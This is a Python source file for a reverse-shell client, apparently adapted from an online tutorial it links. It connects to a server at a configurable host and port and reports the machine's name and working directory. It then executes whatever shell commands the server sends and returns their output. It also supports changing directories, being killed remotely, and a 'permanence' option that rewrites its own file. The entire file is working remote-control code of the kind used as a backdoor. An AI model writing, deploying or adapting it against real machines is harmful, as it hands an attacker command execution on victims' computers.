import socket
import os
import subprocess
import datetime


# https://www.thepythoncode.com/article/create-reverse-shell-python#:~:text=How%20to%20Create%20a%20Reverse%20Shell%20in%20Python,are%20some%20ideas%20to%20extend%20that%20code%3A%20

class client:
    def __init__(self):
        self.ID = ''
        self.SERVER_HOST = '127.0.0.1'  # sys.argv[1]
        self.SERVER_PORT = 2424
        self.BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase
        self.SEPARATOR = '<sep>'  # separator string for sending 2 messages in one go
        self.COMPUTERNAME = os.environ['COMPUTERNAME']
        self.permanence = False

    def set_permanence(self, _permanence: bool):
        self.permanence = _permanence
        return self.permanence

    def set_id(self, _id=None):
        _id = _id or self.COMPUTERNAME
        if self.permanence:
            with open(__file__, 'r') as fr:
                code_with_id = fr.read().replace('ID = \'\'', f'ID = \'{_id}\'')

            with open(__file__, 'w') as fw:
                print('write with permanence')
                fw.write(code_with_id)
        self.ID = _id
        return self.ID

    def get_id(self):
        if self.ID == '':
            self.set_id()
        return self.ID

    def main(self):
        output = ''

        # get the Unique User Identifier
        pc_id = self.get_id()

        # get the current directory
        current_dir = os.getcwd()

        # Generate client first message
        message = f'{output}{self.SEPARATOR}{current_dir}{self.SEPARATOR}{pc_id}'

        # create the socket object
        sock = socket.socket()

        # connect to the server
        sock.connect((self.SERVER_HOST, self.SERVER_PORT))
        sock.send(message.encode(encoding='utf-8'))

        while True:
            output = ' '
            # receive the command from the server
            command = sock.recv(self.BUFFER_SIZE).decode().strip()
            if command not in ['health']:
                print(command)
            if not command:
                continue

            elif command.lower() == '$kill':
                output = 'loop will be killed'
                message = f'{output}{self.SEPARATOR}{current_dir}{self.SEPARATOR}{pc_id}'
                sock.send(message.encode(encoding='utf-8'))
                break  # if the command is exit, just break out of the loop
            elif command.lower()[:3] == '$id':
                if len(command) == 3:
                    output = self.get_id()
                else:
                    output = self.set_id(command[3:].strip())
            elif command.lower() == '$p':
                self.set_permanence(True)
                output = '#$rr ^ PERMANENCE s@*uldn\'t be -_---___ error'
            elif command[:2] == 'cd':  # cd command, change directory (str[start:end:step])
                try:
                    # remove cd and remove leading space
                    command = command[2:].strip()  # removing ending at the same time because why not

                    if len(command) < 3:
                        command += 'c:\\'[len(command):]  # c: --> c:\ and c --> c:\                    at least I hope

                    os.chdir(command)

                except FileNotFoundError as err:
                    output = str(err)  # if there is an error, set as the output

                else:
                    output = ''  # if operation is successful, empty message
            elif command.lower() == 'health':
                output = datetime.datetime.now().timestamp()
            else:
                # execute the command and retrieve the results
                output = subprocess.getoutput(command)

            # get the current working directory as output
            current_dir = os.getcwd()
            # get the Unique User Identifier
            pc_id = self.get_id()

            # send the results back to the server
            message = f'{output}{self.SEPARATOR}{current_dir}{self.SEPARATOR}{pc_id}'
            sock.send(message.encode(encoding='utf-8'))

        sock.close()  # close client connection


if __name__ == '__main__':
    _client = client()
    _client.main()
